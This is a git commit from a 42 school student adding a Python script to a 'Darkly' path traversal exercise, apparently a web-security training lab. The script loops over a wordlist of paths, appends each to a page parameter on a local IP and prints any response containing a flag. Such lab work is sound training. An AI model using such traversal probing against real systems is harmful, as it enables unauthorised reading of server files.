cd42e0316efaed3c17632f4c6b057d4c4730a9aa
rfulop <rfulop@student.42.fr>
2018-12-31 01:54:00 +0100

    Ajout des scripts

---
+++ Darkly/13 - Path Traversal/Ressources/traversal.py
@@ -0,0 +1,18 @@
+import sys
+import requests
+
+URL = "http://192.168.1.13?page="
+
+with open('commondir') as f:
+    content = f.readlines()
+content = [x.strip() for x in content]
+
+for path in content:
+    try:
+        r = requests.get(URL+path)
+        if 'flag' in r.text or 'Flag' in r.text:
+            print(r.text)
+            sys.exit()
+    except Exception:
+        pass
+
